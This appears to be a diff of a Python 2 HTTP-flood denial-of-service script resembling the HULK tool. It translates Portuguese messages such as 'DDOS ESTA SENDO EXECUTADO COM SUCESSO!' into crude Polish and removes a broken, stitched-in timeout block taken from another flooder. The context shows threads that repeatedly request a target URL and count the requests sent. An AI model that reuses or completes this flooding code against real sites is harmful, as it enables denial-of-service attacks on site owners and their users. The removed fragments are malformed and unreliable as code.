@@ -4,17 +4,8 @@ import sys
 import threading
 import random
 import re
-import time
-import os
-import socket, random, time, os, sys
-if len(sys.argv) < 2:
-        print "God-Flood By LiGhT"
-        sys.exit("Usage: python "+sys.argv[0]+" <ip> <port> <size> <time>")
-
 
 #global params
-t1m3 = int(sys.argv[2])
-timeout = time.time() + t1m3
 url=''
 host=''
 headers_useragents=[]
@@ -1172,8 +1163,8 @@ def buildblock(size):
 
 def usage():
 	print '---------------------------------------------------'
-	print 'Spin.py e o site'
-	print 'Feito pelo Sp1n	l0CK '
+	print 'PRAWIDLOWE UZYCIE:'
+	print 'python chuj.py <link> '
 	print '---------------------------------------------------'
 
 	
@@ -1199,7 +1190,7 @@ def httpcall(url):
 	except urllib2.HTTPError, e:
 			#print e.code
 			set_flag(1)
-			print 'DDOS ESTA SENDO EXECUTADO COM SUCESSO!'
+			print 'Wyjebalo!'
 			code=500
 	except urllib2.URLError, e:
 			#print e.reason
@@ -1214,10 +1205,6 @@ def httpcall(url):
 class HTTPThread(threading.Thread):
 	def run(self):
 		try:
-          if time.time() > timeout:
-                        break
-                else:
-                        pass
 			while flag<2:
 				code=httpcall(url)
 				if (code==500) & (safe==1):
@@ -1231,10 +1218,8 @@ class MonitorThread(threading.Thread):
 		previous=request_counter
 		while flag==0:
 			if (previous+100<request_counter) & (previous<>request_counter):
-				print "%d Requests Sent" % (request_counter)
+				print "%d Przeslanych zapytan:" % (request_counter)
 				previous=request_counter
-		if flag==2:
-			print "\n-- JA DEU DDOS DEMAIS POR HOJE '-' --"
 
 #execute 
 if len(sys.argv) < 2:
@@ -1245,7 +1230,7 @@ else:
 		usage()
 		sys.exit()
 	else:
-		print "---- INICIANDO ----"
+		print "Trwa napierdalanie....."
 		if len(sys.argv)== 3:
 			if sys.argv[2]=="safe":
 				set_safe()
